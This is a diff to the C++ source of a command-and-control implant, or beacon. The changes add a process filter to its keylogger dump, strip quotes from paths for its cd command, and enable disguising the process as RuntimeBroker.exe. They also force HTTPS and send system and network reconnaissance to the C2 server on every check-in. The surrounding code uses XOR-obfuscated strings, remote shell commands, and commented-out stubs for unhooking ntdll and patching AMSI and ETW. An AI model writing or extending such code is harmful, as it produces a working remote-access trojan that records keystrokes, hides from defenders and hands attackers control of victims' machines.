@@ -101,10 +101,13 @@ struct Task {
 
 inline std::vector<Task> parse_tasks(const std::string& json) {
     std::vector<Task> tasks;
-    // Find the "tasks" array
-    size_t arr_start = json.find(XOR_DEC(XOR_STR("\"tasks\":[")).c_str());
+    // Find the "tasks" key
+    size_t key_pos = json.find(XOR_DEC(XOR_STR("\"tasks\"")).c_str());
+    if (key_pos == std::string::npos) return tasks;
+    
+    // Find the start of the array [
+    size_t arr_start = json.find('[', key_pos);
     if (arr_start == std::string::npos) return tasks;
-    arr_start = json.find('[', arr_start);
 
     // Find each { ... } object in the array
     size_t pos = arr_start;
@@ -356,6 +359,12 @@ std::string dispatch_command(const std::string& cmd) {
         std::string path;
         std::getline(iss >> std::ws, path);
         if (path.empty()) return XOR_DEC(XOR_STR("Usage: cd <path>")).c_str();
+        
+        // Strip quotes if present
+        if (path.size() >= 2 && path.front() == '"' && path.back() == '"') {
+            path = path.substr(1, path.size() - 2);
+        }
+
 #ifdef _WIN32
         if (SetCurrentDirectoryA(path.c_str())) return XOR_DEC(XOR_STR("Directory changed to ")).c_str() + path + XOR_DEC(XOR_STR("\n")).c_str();
 #else
@@ -393,12 +402,15 @@ std::string dispatch_command(const std::string& cmd) {
         return XOR_DEC(XOR_STR("SLEEP_SET")).c_str();
     }
     else if (action == XOR_DEC(XOR_STR("keylog")).c_str()) {
-        std::string subCmd;
+        std::string subCmd, filter;
         iss >> subCmd;
         if (subCmd == XOR_DEC(XOR_STR("start")).c_str()) return keylogger::start();
         if (subCmd == XOR_DEC(XOR_STR("stop")).c_str())  return keylogger::stop();
-        if (subCmd == XOR_DEC(XOR_STR("dump")).c_str())  return keylogger::dump();
-        return XOR_DEC(XOR_STR("Usage: keylog <start|stop|dump>")).c_str();
+        if (subCmd == XOR_DEC(XOR_STR("dump")).c_str()) {
+            iss >> filter;
+            return keylogger::dump(filter);
+        }
+        return XOR_DEC(XOR_STR("Usage: keylog <start|stop|dump [process]>")).c_str();
     }
     else if (action == XOR_DEC(XOR_STR("shell")).c_str() || action == XOR_DEC(XOR_STR("exec")).c_str() || action == XOR_DEC(XOR_STR("run")).c_str()) {
         std::string shell_cmd;
@@ -495,7 +507,7 @@ void beacon_main(int argc, char** argv) {
     // anti::unhook_ntdll(); 
     // anti::patch_amsi();
     // anti::patch_etw();
-    // anti::masquerade::rename_process(L"svchost.exe");
+    anti::masquerade::rename_process(L"RuntimeBroker.exe");
 #endif
 
     // 3. Stalling delay (Disabled)
@@ -522,7 +534,7 @@ void beacon_main(int argc, char** argv) {
         cfg.host = std::wstring(host_str.begin(), host_str.end());
         if (argc >= 3) cfg.port = std::atoi(argv[2]);
     }
-    cfg.use_https = (cfg.port == 443 || cfg.port == 8443);
+    cfg.use_https = true; // Match server default
 
     // ── Beacon Loop ────────────────────────────────────────────────────────
     bool alive = true;
@@ -543,14 +555,11 @@ void beacon_main(int argc, char** argv) {
     };
 
     while (alive) {
-        // 1. Check in with C2
-        std::string telemetry = "";
-        if (first_checkin) {
-            telemetry = XOR_DEC(XOR_STR("{\"sysinfo\":\"")).c_str() + escape_json(recon::get_sysinfo()) + 
-                        XOR_DEC(XOR_STR("\",\"netinfo\":\"")).c_str() + escape_json(recon::get_netinfo()) + XOR_DEC(XOR_STR("\"}")).c_str();
-        }
+        // 1. Check in with C2 - Invia telemetria ad ogni check-in
+        std::string telemetry = XOR_DEC(XOR_STR("{\"sysinfo\":\"")).c_str() + escape_json(recon::get_sysinfo()) + 
+                    XOR_DEC(XOR_STR("\",\"netinfo\":\"")).c_str() + escape_json(recon::get_netinfo()) + XOR_DEC(XOR_STR("\"}")).c_str();
+        
         std::string response = net::checkin(cfg, telemetry);
-        if (!response.empty()) first_checkin = false;
 
         if (!response.empty()) {
             // 2. Parse tasks
@@ -599,6 +608,7 @@ void beacon_main(int argc, char** argv) {
 
     // Cleanup
     portfwd::stop_all_forwards();
+    net::cleanup();
 #ifdef _WIN32
     WSACleanup();
 #endif
